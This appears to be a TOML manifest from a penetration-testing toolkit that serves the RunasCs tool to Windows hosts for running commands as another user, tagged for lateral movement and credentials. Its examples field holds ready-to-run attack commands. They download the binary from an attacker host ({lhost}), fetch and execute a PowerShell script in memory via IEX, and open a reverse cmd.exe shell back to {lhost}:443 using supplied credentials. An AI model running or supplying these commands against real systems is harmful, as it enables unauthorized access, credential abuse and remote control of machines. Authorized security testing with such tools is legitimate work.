schema = 1
kind = "upload"
description = "Run a command as another Windows user, from a shell with no desktop"
tags = ["windows", "lateral", "credentials", "runas"]
upstream = "https://github.com/antonioCoco/RunasCs"
licence = "GPL-3.0"
arch = "x86_64"
examples = [
  "iwr http://{lhost}/RunasCs.exe -OutFile RunasCs.exe",
  "RunasCs.exe <user> <password> cmd.exe -r {lhost}:443",
  "IEX(IWR -UseBasicParsing http://{lhost}/Invoke-RunasCs.ps1); Invoke-RunasCs -Username <user> -Password <password> -Command cmd.exe -Remote {lhost}:443",
]

[[upload]]
path = "files/RunasCs.exe"
as = "RunasCs.exe"
note = "Windows with .NET 4"

[[upload]]
path = "files/RunasCs_net2.exe"
as = "RunasCs_net2.exe"
note = "Windows with .NET 2"

[[upload]]
path = "files/Invoke-RunasCs.ps1"
as = "Invoke-RunasCs.ps1"
note = "The same tool as a PowerShell script, to load in memory"
